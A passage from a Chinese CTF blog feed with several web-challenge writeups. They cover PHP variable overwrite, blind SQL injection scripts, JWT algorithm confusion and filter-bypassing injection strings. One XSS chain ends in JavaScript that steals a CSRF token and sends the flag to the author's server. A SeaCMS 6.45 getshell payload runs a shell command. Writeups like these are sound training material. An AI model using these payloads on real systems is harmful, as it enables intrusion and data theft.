class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">error_reporting(<span class="number">0</span>); </span><br><span class="line"><span class="keyword">include</span>(<span class="string">"flag.php"</span>); </span><br><span class="line">$hashed_key = <span class="string">'ddbafb4eb89e218701472d3f6c087fdf7119dfdd560f9d1fcbe7482b0feea05a'</span>; </span><br><span class="line">$parsed = parse_url($_SERVER[<span class="string">'REQUEST_URI'</span>]); </span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($parsed[<span class="string">"query"</span>]))&#123; </span><br><span class="line">    $query = $parsed[<span class="string">"query"</span>]; </span><br><span class="line">    $parsed_query = parse_str($query); </span><br><span class="line">    <span class="keyword">if</span>($parsed_query!=<span class="keyword">NULL</span>)&#123; </span><br><span class="line">        $action = $parsed_query[<span class="string">'action'</span>]; </span><br><span class="line">    &#125; </span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>($action===<span class="string">"auth"</span>)&#123; </span><br><span class="line">        $key = $_GET[<span class="string">"key"</span>]; </span><br><span class="line">        $hashed_input = hash(<span class="string">'sha256'</span>, $key); </span><br><span class="line">        <span class="keyword">if</span>($hashed_input!==$hashed_key)&#123; </span><br><span class="line">            <span class="keyword">die</span>(<span class="string">"&lt;img src='cxk.jpg'&gt;"</span>); </span><br><span class="line">        &#125; </span><br><span class="line"></span><br><span class="line">        <span class="keyword">echo</span> $flag; </span><br><span class="line">    &#125; </span><br><span class="line">&#125;<span class="keyword">else</span>&#123; </span><br><span class="line">    show_source(<span class="keyword">__FILE__</span>); </span><br><span class="line">&#125;<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p><p>看到<code>parse_str</code>函数，变量覆盖的老朋友了。。。随便给key赋个值，然后将key sha256加密后的值覆盖变量hashed_key的值</p><blockquote><p>payload?/?action=auth&amp;key=1&amp;hashed_key=6b86b273ff34fce19d6b804eff5a3f5747ada4eaa22f1d49c01e52ddb7875b4b</p></blockquote><img src="/2019/05/22/ISCC2019-Web-Writeup/5.jpg"><h1 id="web5"><a href="#web5" class="headerlink" title="web5"></a>web5</h1><p>感觉有点脑洞啊……<br>主页说我不是Union.373的成员（虽然我确实不是）,很长一段时间没找到突破口。最后在User-Agent后加上Union.373就进去了。嗯？？？</p><img src="/2019/05/22/ISCC2019-Web-Writeup/6.jpg"><p>接着要我们输入用户名和密码，直接post<code>username=admin&amp;password=admin</code>得到提示：flag为成员的密码<br>通过payload<code>username=&#39;\*/\*&amp;password=*/&#39;</code>可以得到成员的用户名，然后进行注入<br>脚本：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding = utf-8</span></span><br><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">"http://39.100.83.188:8054/"</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">http_get</span><span class="params">(payload)</span>:</span></span><br><span class="line">    str_16 = binascii.b2a_hex(payload.encode(<span class="string">'utf-8'</span>))</span><br><span class="line">    payload = <span class="string">"username=union_373_Tom' union all select 1,2,0x"</span> + str_16.decode() + <span class="string">" /*&amp;password=*/ order by 3,2,'1"</span></span><br><span class="line">    headers = &#123;</span><br><span class="line">        <span class="string">'user-agent'</span>: <span class="string">"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36Union.373"</span>,</span><br><span class="line">        <span class="string">'Content-Type'</span>: <span class="string">"application/x-www-form-urlencoded"</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    response = requests.post(url, data=payload, headers=headers)</span><br><span class="line">    response.encoding = <span class="string">'utf-8'</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> <span class="string">'组织欢迎你，2!'</span> <span class="keyword">in</span> response.text:</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">False</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">True</span></span><br><span class="line"></span><br><span class="line">flag = <span class="string">''</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="keyword">True</span>:</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">33</span>,<span class="number">127</span>):</span><br><span class="line">        temp_str=chr(i)</span><br><span class="line">        print(<span class="string">'\rflag--&gt;'</span>+flag+temp_str,end=<span class="string">''</span>,flush=<span class="keyword">True</span>)</span><br><span class="line">        <span class="keyword">if</span> http_get(flag + temp_str):</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">if</span> temp_str==chr(<span class="number">33</span>):</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    flag += chr(ord(temp_str) - <span class="number">1</span>)</span><br></pre></td></tr></table></figure></p><img src="/2019/05/22/ISCC2019-Web-Writeup/7.jpg"><h1 id="web6"><a href="#web6" class="headerlink" title="web6"></a>web6</h1><p>老规矩先注册，再登录。登上去发现header中多了这么个玩意儿</p><img src="/2019/05/22/ISCC2019-Web-Writeup/8.jpg"><p>iscc99后面是一段JWT，猜测本题是考JWT攻击。到<a href="https://jwt.io解一下" target="_blank" rel="noopener">https://jwt.io解一下</a></p><img src="/2019/05/22/ISCC2019-Web-Writeup/9.jpg"><p>发现网页中有这样一个接口</p><img src="/2019/05/22/ISCC2019-Web-Writeup/10.jpg"><p>末尾处是一段公钥加密代码<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getpubkey</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="comment">/* </span></span><br><span class="line"><span class="comment">    get the pubkey for test</span></span><br><span class="line"><span class="comment">    /pubkey/&#123;md5(username+password)&#125;</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>依据此加密方式可知我的公钥地址：<code>/pubkey/a3cd2d4c60cad6118c24e081238c007e</code>（账号密码均为cryscat）<br>得到公钥：</p><blockquote><p>—–BEGIN PUBLIC KEY—–\nMIGfMA0GCSqGSIb3DQEBAQUAA4GNADCBiQKBgQDMRTzM9ujkHmh42aXG0aHZk/PK\nomh6laVF+c3+D+klIjXglj7+/wxnztnhyOZpYxdtk7FfpHa3Xh4Pkpd5VivwOu1h\nKk3XQYZeMHov4kW0yuS+5RpFV1Q2gm/NWGY52EaQmpCNFQbGNigZhu95R2OoMtuc\nIC+LX+9V/mpyKe9R3wIDAQAB\n—–END PUBLIC KEY—–</p></blockquote><p>RS256算法使用私钥对消息进行签名并使用公钥进行身份验证，而HS256算法使用密钥为所有消息进行签名和验证。如果将算法从RS256改为HS256，则后端代码将使用公钥作为密钥，然后使用HS256算法验证签名。所以在这里我们考虑将RS256算法改为HS256（非对称密码算法=&gt;对称密码算法）来达到pubkey任意访问的目的。</p><p>将priv改为admin,加密脚本：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> jwt</span><br><span class="line">pubkey = <span class="string">'-----BEGIN PUBLIC KEY-----\nMIGfMA0GCSqGSIb3DQEBAQUAA4GNADCBiQKBgQDMRTzM9ujkHmh42aXG0aHZk/PK\nomh6laVF+c3+D+klIjXglj7+/wxnztnhyOZpYxdtk7FfpHa3Xh4Pkpd5VivwOu1h\nKk3XQYZeMHov4kW0yuS+5RpFV1Q2gm/NWGY52EaQmpCNFQbGNigZhu95R2OoMtuc\nIC+LX+9V/mpyKe9R3wIDAQAB\n-----END PUBLIC KEY-----'</span></span><br><span class="line">print(jwt.encode(&#123;<span class="string">"name"</span>: <span class="string">"cryscat"</span>,<span class="string">"priv"</span>: <span class="string">"admin"</span>&#125;, key=pubkey, algorithm=<span class="string">'HS256'</span>))</span><br></pre></td></tr></table></figure></p><p>得到我们的可利用JWT</p><img src="/2019/05/22/ISCC2019-Web-Writeup/11.jpg"><p>换上这段JWT去访问list可以看到很多用户留下的链接</p><img src="/2019/05/22/ISCC2019-Web-Writeup/12.jpg"><p>common.js接口中给出了链接信息的查看方式<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getlist</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    token = <span class="built_in">window</span>.localStorage.getItem(<span class="string">"token"</span>);</span><br><span class="line">    <span class="keyword">if</span> (token==<span class="literal">null</span>||token==<span class="literal">undefined</span>)&#123;</span><br><span class="line">        alert(<span class="string">"u must login first"</span>);</span><br><span class="line">        <span class="built_in">window</span>.location.href = <span class="string">"/"</span>;</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    auth = <span class="string">"iscc19 "</span> + token;</span><br><span class="line">    $.ajax(&#123;</span><br><span class="line">        url: <span class="string">'/list'</span>,</span><br><span class="line">        type: <span class="string">'GET'</span>,</span><br><span class="line">        headers:&#123;<span class="string">"Authorization"</span>:auth&#125;,</span><br><span class="line">    &#125;)</span><br><span class="line">    .success(<span class="function"><span class="keyword">function</span>(<span class="params">data</span>) </span>&#123;</span><br><span class="line">        result = data.result;</span><br><span class="line">        <span class="keyword">if</span>(result)&#123;</span><br><span class="line">            content = <span class="string">"the user "</span> + data.username +<span class="string">" has these links:\n"</span>;</span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">var</span> i <span class="keyword">in</span> data.links)&#123;</span><br><span class="line">                content = content + <span class="string">"/text/"</span> + data.links[i] + <span class="string">"\n"</span>;</span><br><span class="line">            &#125; </span><br><span class="line">            alert(content);</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            alert(<span class="string">"list fail"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;);  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>其中有一条是admin的，应该就是flag的所在之处了，即访问<code>/text/admin:22f1e0aa7a31422ad63480aa27711277</code>getflag</p><img src="/2019/05/22/ISCC2019-Web-Writeup/13.jpg">]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;web1&quot;&gt;&lt;a href=&quot;#web1&quot; class=&quot;headerlink&quot; title=&quot;web1&quot;&gt;&lt;/a&gt;web1&lt;/h1&gt;&lt;p&gt;代码审计&lt;br&gt;&lt;figure class=&quot;highlight php&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gu
      
    
    </summary>
    
    
      <category term="ISCC" scheme="http://www.cryscat.com/tags/ISCC/"/>
    
      <category term="Writeup" scheme="http://www.cryscat.com/tags/Writeup/"/>
    
      <category term="CTF" scheme="http://www.cryscat.com/tags/CTF/"/>
    
      <category term="Web" scheme="http://www.cryscat.com/tags/Web/"/>
    
  </entry>
  
  <entry>
    <title>一次有趣的XSS弹弹乐</title>
    <link href="http://www.cryscat.com/2019/04/08/%E4%B8%80%E6%AC%A1%E6%9C%89%E8%B6%A3%E7%9A%84XSS%E5%BC%B9%E5%BC%B9%E4%B9%90/"/>
    <id>http://www.cryscat.com/2019/04/08/一次有趣的XSS弹弹乐/</id>
    <published>2019-04-08T13:20:32.000Z</published>
    <updated>2019-04-09T09:37:34.000Z</updated>
    
    <content type="html"><![CDATA[<img src="/2019/04/08/一次有趣的XSS弹弹乐/1.jpg"><h1 id="这是标题-๑¯∀¯๑"><a href="#这是标题-๑¯∀¯๑" class="headerlink" title="这是标题(๑¯∀¯๑)"></a>这是标题(๑¯∀¯๑)</h1><p>主页：<br><img src="/2019/04/08/一次有趣的XSS弹弹乐/2.jpg"></p><p>对着输入框一顿乱锤没反应，还是老老实实注册了个账号登进去了<br>登进去是这样的：<br><img src="/2019/04/08/一次有趣的XSS弹弹乐/3.jpg"></p><p>site填入自己的服务器地址发现他会访问。经过简单测试发现这里存在反射型XSS，通过大写可以绕过waf</p><blockquote><p>&lt;SCRIPT>alert(1)&lt;SCRIPT></p></blockquote><img src="/2019/04/08/一次有趣的XSS弹弹乐/4.jpg"><p>但输入的内容不符合网站格式，admin不会访问</p><p>这里发现一个getInfo接口，返回 jsonp 数据，也存在反射型xss,而且没上waf<br><img src="/2019/04/08/一次有趣的XSS弹弹乐/5.jpg"><br><img src="/2019/04/08/一次有趣的XSS弹弹乐/6.jpg"></p><p>访问接口需要进行referer验证<br><img src="/2019/04/08/一次有趣的XSS弹弹乐/7.jpg"></p><p>flag是通过getflag接口获取的，需要参数是csrftoken<br><img src="/2019/04/08/一次有趣的XSS弹弹乐/8.jpg"><br>获取ﬂag的权限是通过 jsonp 中的 username验证的 ，这个 username 是后端解密 cookie 中的username 得到的明文。cookie 中的 username 受 http-only 保护不可读取，也没有能显示出 cookie 中加密的 username 的页面，于是只能控制admin去访问ﬂag页面然后返回给我们了</p><p>这时候的攻击思路就比较明确了：site填入<code>http://xxxx/action.php?callback=\&lt;js代码&gt;</code>让admin访问这个url触发XSS获取自己的csrftoken值，然后带着这个值访问getflag接口，最后再将flag内容发送到我们的服务器。<br>但是又遇到一个问题：site可填入的url长度太短了，根本不可能填入这样一个附带JS脚本的url，那只能另辟蹊径了</p><p>另一条攻击链：</p><blockquote><p>链接 –&gt; 302跳转到 jsonp xss –&gt; 提取 jsonp 中 csrftoken  –&gt; xhr 控制读取 flag –&gt; 返回flag到服务器</p></blockquote><p>site:<code>http://my_ip/xss.php</code><br>xss.php:<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">header(<span class="string">'Location: http://target_ip/action.php?callback=&lt;script+src="http://my_ip/xss.js"&gt;&lt;/script&gt;'</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p><p>HTTP_REFERER 是由 html 文档对象 document 提供的,Location 是 http 协议的头部内容,浏览器一旦收到，就执行了,此时 document 尚未创建,所以此时的referer还是<code>http://target_ip/loged.php</code></p><p>xss.js:<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">window</span>.onload = <span class="function"><span class="keyword">function</span> <span class="title">cryscat</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"><span class="keyword">var</span> obj = <span class="built_in">eval</span>(<span class="string">'('</span>+<span class="built_in">document</span>.body.innerText+<span class="string">')'</span>);</span><br><span class="line"><span class="keyword">var</span> ct = obj.csrftoken;</span><br><span class="line"><span class="keyword">var</span> xml = <span class="keyword">new</span> XMLHttpRequest();</span><br><span class="line">xml.open(<span class="string">'Get'</span>,<span class="string">'http://target_ip/getflag.php?csrftoken='</span>+ct,<span class="literal">false</span>);</span><br><span class="line">xml.send();</span><br><span class="line"><span class="keyword">var</span> res = xml.responseText;</span><br><span class="line"><span class="built_in">window</span>.open(<span class="string">'http://my_ip/?msg='</span>+res);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>最后返回的data:</p><blockquote><p>{‘flag’:’flag{j50nP_1s_VulN3r4bLe}’,’csrftoken’:’058807fed91d1b8807688bd258710cbe’} IP: 111.198.29.45  Referer: <a href="http://111.198.29.45:30987/action.php" target="_blank" rel="noopener">http://111.198.29.45:30987/action.php</a>? callback=%3Cscript+src=%22<a href="http://my_ip/xss.js%22%3E%3C%2Fscript%3E" target="_blank" rel="noopener">http://my_ip/xss.js%22%3E%3C%2Fscript%3E</a></p></blockquote><p>Thank you for reading.(・ω&lt;)</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;img src=&quot;/2019/04/08/一次有趣的XSS弹弹乐/1.jpg&quot;&gt;
&lt;h1 id=&quot;这是标题-๑¯∀¯๑&quot;&gt;&lt;a href=&quot;#这是标题-๑¯∀¯๑&quot; class=&quot;headerlink&quot; title=&quot;这是标题(๑¯∀¯๑)&quot;&gt;&lt;/a&gt;这是标题(๑¯∀¯๑)&lt;/
      
    
    </summary>
    
    
      <category term="CTF" scheme="http://www.cryscat.com/tags/CTF/"/>
    
      <category term="XSS" scheme="http://www.cryscat.com/tags/XSS/"/>
    
      <category term="Trick" scheme="http://www.cryscat.com/tags/Trick/"/>
    
      <category term="Note" scheme="http://www.cryscat.com/tags/Note/"/>
    
  </entry>
  
  <entry>
    <title>嘉韦斯杯Writeup</title>
    <link href="http://www.cryscat.com/2019/04/01/%E5%98%89%E9%9F%A6%E6%96%AF%E6%9D%AFWriteup/"/>
    <id>http://www.cryscat.com/2019/04/01/嘉韦斯杯Writeup/</id>
    <published>2019-04-01T15:38:32.000Z</published>
    <updated>2019-04-03T15:45:18.000Z</updated>
    
    <content type="html"><![CDATA[<img src="/2019/04/01/嘉韦斯杯Writeup/1.jpg"><h1 id="壹"><a href="#壹" class="headerlink" title="壹"></a>壹</h1><p>一道SQL注入题，直接上sqlmap跑<br><img src="/2019/04/01/嘉韦斯杯Writeup/2.jpg"></p><h1 id="贰"><a href="#贰" class="headerlink" title="贰"></a>贰</h1><p>打开链接，主页是一长串字符，base64解密，解出来是一段JSfuck编码，直接丢进浏览器的控制台，出flag</p><h1 id="叁"><a href="#叁" class="headerlink" title="叁"></a>叁</h1><p>主页是一串十六进制的运算式，题目说要我们2秒内计算出结果并提交，所以这一题要靠脚本解决（正则表达式不会写，在正则表达式网站试了试，得出了能将式子全都提取出来的正则表达式，之后再进行一个式子截取，去掉其他无关字符）<br>脚本：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line">url = <span class="string">'http://47.103.43.235:82/web/a/index.php'</span></span><br><span class="line">r = requests.session()</span><br><span class="line">res = r.get(url).text</span><br><span class="line">cont = re.findall(<span class="string">'-?[0-9xABCDEF]\d*[\+\-\*\%\^/( )]*'</span>,res)</span><br><span class="line">cont = <span class="string">""</span>.join(cont)</span><br><span class="line">resu = eval(cont[<span class="number">1</span>:<span class="number">59</span>])</span><br><span class="line">data = &#123;<span class="string">'result'</span>:resu&#125;</span><br><span class="line">ans = r.post(url,data = data)</span><br><span class="line">print(ans.text)</span><br></pre></td></tr></table></figure></p><p>赛后专门琢磨了html内容提取，本体还可以用<code>str.split(&quot;&lt;p&gt;&quot;)</code>和<code>str.split(&quot;&lt;/p&gt;&quot;)</code>进行截取，截取方式不唯一，自己喜欢的才是最好的┓( ´-` )┏</p><h1 id="肆"><a href="#肆" class="headerlink" title="肆"></a>肆</h1><p>打开链接是一张二维码图片，保存到本地，用binwalk分离出其中的压缩包<br><img src="/2019/04/01/嘉韦斯杯Writeup/3.jpg"><br>压缩包中有一个key.txt文件，flag应该就在里面了，解压发现需要密码，首先尝试伪加密破解，无果，应该是实打实的加密了，开始爆破密码，爆出密码：674290437，查看key.txt获得flag</p><h1 id="伍"><a href="#伍" class="headerlink" title="伍"></a>伍</h1><p>神奇的密码1</p><p>又是一长串的字符，看出是base64，进行解密，又是一层base64，其中解出的base64编码的=都是%3D表示的。要将这部分url编码换成=再进行解码。最后解出得到fB__l621a4h4g_ai%7B%26i%7D<br>将其中的url编码解码得到fB__l621a4h4g_ai{&amp;i}<br>可以看到这像是一段打乱顺序的flag，试试栅栏密码、凯撒密码和列移位密码<br>最终在栅栏密码5字一组的时候试出flag{B64_&amp;_2hai_14i}</p><h1 id="陆"><a href="#陆" class="headerlink" title="陆"></a>陆</h1><p>神奇的密码2</p><p>题目给了一串字符：bg[`sZ*Zg’dPfP`VM_SXVd<br>密码学的题，没多大头绪，规律是学长找出来的<br>脚本：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">str=<span class="string">'bg[`sZ*Zg\'dPfP`VM_SXVd'</span></span><br><span class="line">strlen=len(str)</span><br><span class="line">i=<span class="number">3</span></span><br><span class="line">flag=<span class="string">''</span></span><br><span class="line"><span class="keyword">for</span> c <span class="keyword">in</span> str:</span><br><span class="line">i=i+<span class="number">1</span></span><br><span class="line">flag=flag+chr(ord(c)+i)</span><br><span class="line">print(flag)</span><br></pre></td></tr></table></figure></p><h1 id="柒"><a href="#柒" class="headerlink" title="柒"></a>柒</h1><p>又是一道SQL注入题，这题鼓捣了好久！</p><p>经过测试发现id=后面是以base64加密逆序输入的，过滤了<code>or</code>、<code>=</code>、<code>”</code>、<code>&#39;</code>、<code>union</code>、<code>select</code>，并且不需要闭合引号</p><blockquote><p>爆库：<br>0/**/uunionnion/**/selselectect/**/1,2,3,4,5,database()#<br>=MSKoU2chJWY0FGZsUDL0wyMsIDLx8iKq8CdjVGdjVGblNHblN3LqoyLu9Wau52bp5Wd19iKq8CM</p></blockquote><blockquote><p>爆表：<br>0/**/uunionnion/**/selselectect/**/1,2,3,4,5,table_name/**/from/**/infoorrmation_schema.tables/**/where/**/table_schema/**/like/**/database()#<br>=owIpgSZzFmYhRXYk9iKq8SZrlGbvoiKvEWblh2Yz9VZsJWY09iKq8SZyVGa39iKq8yclxmYhRnLh1WZoN2cf52bpRXYtJncv9mZul2LqoyLt9mcm9iKq8SZtFmbfVGbiFGdsUDL0wyMsIDLx8iKq8CdjVGdjVGblNHblN3LqoyLu9Wau52bp5Wd19iKq8CM</p></blockquote><blockquote><p>爆列：<br>0/**/uunionnion/**/selselectect/**/1,2,3,4,5,column_name/**/from/**/infoorrmation_schema.columns/**/where/**/table_name/**/like/**/0x666C6167 #<br>=MCI3YTM2MkN2YDew8iKq8SZrlGbvoiKvUWbh52XlxmYhR3LqoyLlJXZod3LqoyLz5Wb1x2bj5SYtVGajN3Xu9Wa0FWbyJ3bvZmbp9iKq8SbvJnZvoiKvUWbh52Xu1Wds92YsUDL0wyMsIDLx8iKq8CdjVGdjVGblNHblN3LqoyLu9Wau52bp5Wd19iKq8CM</p></blockquote><blockquote><p>最后payload：<br>0/**/uniunionon/**/seselectlect/**/1,2,3,4,5,flag/**/from/**/flag#<br>jcWYsZ2LqoyLt9mcm9iKq8yZhxmZsUDL0wyMsIDLx8iKq8CdjVGb0NWZsV2clN3LqoyLu9mbvlmb1lmb19iKq8CM</p></blockquote><img src="/2019/04/01/嘉韦斯杯Writeup/4.jpg"><h1 id="捌"><a href="#捌" class="headerlink" title="捌"></a>捌</h1><p>上Kali的openssl，其中e就是exponent的值，转成十进制：<br><img src="/2019/04/01/嘉韦斯杯Writeup/5.jpg"></p><p>将解出的这串数字进行因式分解<br><a href="http://factordb.com" target="_blank" rel="noopener">http://factordb.com</a><br><img src="/2019/04/01/嘉韦斯杯Writeup/6.jpg"></p><p>最后用python脚本进行解密：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding:utf-8 </span></span><br><span class="line"><span class="keyword">import</span> gmpy </span><br><span class="line"><span class="keyword">import</span> rsa </span><br><span class="line">p = <span class="number">273821108020968288372911424519201044333</span></span><br><span class="line">q = <span class="number">280385007186315115828483000867559983517</span></span><br><span class="line">n = <span class="number">76775333340223961139427050707840417811156978085146970312315886671546666259161</span></span><br><span class="line">e = <span class="number">65537</span> </span><br><span class="line">d = int(gmpy.invert(e , (p<span class="number">-1</span>) * (q<span class="number">-1</span>))) </span><br><span class="line">privatekey = rsa.PrivateKey(n , e , d , p , q)      <span class="comment">#根据已知参数，计算私钥 </span></span><br><span class="line"><span class="keyword">with</span> open(<span class="string">"fllllllag.txt"</span> , <span class="string">"rb"</span>) <span class="keyword">as</span> f: </span><br><span class="line">    print(rsa.decrypt(f.read(), privatekey).decode())   <span class="comment">#使用私钥对密文进行解密，并打印</span></span><br></pre></td></tr></table></figure></p><img src="/2019/04/01/嘉韦斯杯Writeup/7.jpg"><h1 id="玖"><a href="#玖" class="headerlink" title="玖"></a>玖</h1><p>seacms</p><p>这道题是直接利用海洋CMS 6.45版本前台getshell漏洞的payload打下来的<br>Payload：</p><blockquote><p>searchtype=5&amp;searchword={if{searchpage:year}&amp;year=:e{searchpage:area}}&amp;area=v{searchpage:letter}&amp;letter=al{searchpage:lang}&amp;yuyan=(join{searchpage:jq}&amp;jq=($_P{searchpage:ver}&amp;ver=OST[9]))&amp;9[]=sy&amp;9[]=stem(‘cat ../../flag.txt’);</p></blockquote><h1 id="拾"><a href="#拾" class="headerlink" title="拾"></a>拾</h1><p>查看源代码获得提示index.phps，得到主页源代码<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">$flag = <span class="string">'********'</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_POST[<span class="string">'name'</span>]) <span class="keyword">and</span> <span class="keyword">isset</span>($_POST[<span class="string">'password'</span>]))&#123;</span><br><span class="line"><span class="keyword">if</span> ($_POST[<span class="string">'name'</span>] == $_POST[<span class="string">'password'</span>])</span><br><span class="line"><span class="keyword">print</span> <span class="string">'name and password must be diffirent'</span>;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> (sha1($_POST[<span class="string">'name'</span>]) === sha1($_POST[<span class="string">'password'</span>]))</span><br><span class="line"><span class="keyword">die</span>($flag);</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">print</span> <span class="string">'invalid password'</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p><p>题目的关键点是name和password传入的内容要不同并且name和password的sha1值类型和内容都相同。那么就是主要考虑sha1对比的绕过。sha1函数要求传入的参数是字符串类型，那传入两个比如数组类型，结果就都是false,这样就会输出flag了<br><img src="/2019/04/01/嘉韦斯杯Writeup/8.jpg"></p><h1 id="拾壹"><a href="#拾壹" class="headerlink" title="拾壹"></a>拾壹</h1><p>查看网页源代码<br><img src="/2019/04/01/嘉韦斯杯Writeup/9.jpg"></p><p>这道题上来首先就将我们传入的param1和param2类型转化为string，所以是不能通过数组绕过了。直接在网上搜了这样的两个值post上去：<br><img src="/2019/04/01/嘉韦斯杯Writeup/10.jpg"></p><h1 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h1><p>这次比赛一共15道题，有四道没做出来，两道脑洞题，两道逆向（逆向真不是谁都能玩的啊！）。其中有一道希尔密码的题花的时间最多（关于希尔密码的加密解密有兴趣的同学可以自行百度，这里不再赘述），脚本是历经千辛万苦找到了，但最后flag还是不对……于是我去问了主办方，主办方说是这题有脑洞！！！行吧！<br>希尔密码解密脚本：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span 